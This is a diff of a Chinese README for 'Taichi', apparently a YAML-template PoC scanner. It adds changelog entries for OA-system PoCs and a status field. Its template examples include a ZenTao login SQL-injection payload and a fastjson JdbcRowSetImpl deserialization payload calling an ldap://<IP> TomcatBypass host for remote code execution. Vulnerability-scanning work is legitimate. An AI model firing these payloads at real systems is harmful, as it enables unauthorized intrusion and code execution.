@@ -17,24 +17,28 @@
 
 - 新增poc名称显示
 
-- 新增蓝凌OApoc
-
+- 新增蓝凌OA poc
 
 **2023.3.26**
 
 - 重构部分代码，删除attack.py
-
 - 取消type参数
-
-- 新增致远OApoc
+- 新增致远OA poc
 - 适配dns探测
 - 适配fastjson反序列化
 
+**2023.3.28**
+
+- 增加status参数
+- 新增通达OA poc
+
 # 前言
 
-之前写了几个poc，感觉代码有很多相似的地方，所以我寻思能不能写个大体框架，这样以后就不用改来改去了。当然，我也知道有nuclei这样成熟好用的工具，但是我还是想试试，所以就搞了一个这个。（大佬勿喷）
+开发这款工具的目的是为了让安全从业者，刚接触安全初学者更快编写poc。当然，我也知道有nuclei这样成熟好用的工具，但是自己动手丰衣足食，所以这款工具就诞生了。（大佬勿喷）
 
-目前才搞了几天，测试的数量也不多，算是个雏形，所以会有很多bug，请见谅。如有bug或者建议欢迎联系我
+目前poc以及程序测试不多（有的漏洞几乎找不到了），为了提高效率，我一直在增加poc，所以可能会有较多bug，请见谅。
+
+发现bug或者有建议欢迎联系我。
 
 # 介绍
 
@@ -114,18 +118,22 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 - method:
   - method: "post"
 
+#漏洞的位置
+- url:
+  - url : "/zentao/user-login.html"
+
 #payload
 - payload:
   - payload: "account=admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"
+
+#response包里的状态码
+- status:
+  - status: "200"
 
 #response包里的关键字
 - word:
   - word:
       - "8f14e45fceea167a5a36dedd4bea254"
-
-#漏洞的位置
-- url:
-  - url : "/zentao/user-login.html"
 
 #验证是否攻击成功的 请求方式
 - method-V:
@@ -134,7 +142,7 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 #webshell位置
 - verify:
   - verify : "isNone"
-  
+
 #cmd 为了适配Java反序列化漏洞
 - cmd:
   - cmd : "isNone"
@@ -151,6 +159,14 @@ reques的方式，根据自己需求来定
 #### payload
 
 顾名思义就是payload
+
+#### status
+
+response包里的状态码，根据burp的poc填写
+
+#### word
+
+response包里的关键字，目前只能写一个，根据burp的poc填写
 
 #### response
 
@@ -252,6 +268,10 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 - payload:
   - payload: "isNone"
 
+#response包里状态码
+- status:
+  - status: "200"
+
 #response包里的关键字
 - word:
   - word:
@@ -296,6 +316,10 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 #payload
 - payload:
   - payload: '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<IP>:1289/TomcatBypass/TomcatEcho","autoCommit":true}}'
+
+#response包里状态码
+- status:
+  - status: "200"
 
 #response包里的关键字
 - word:
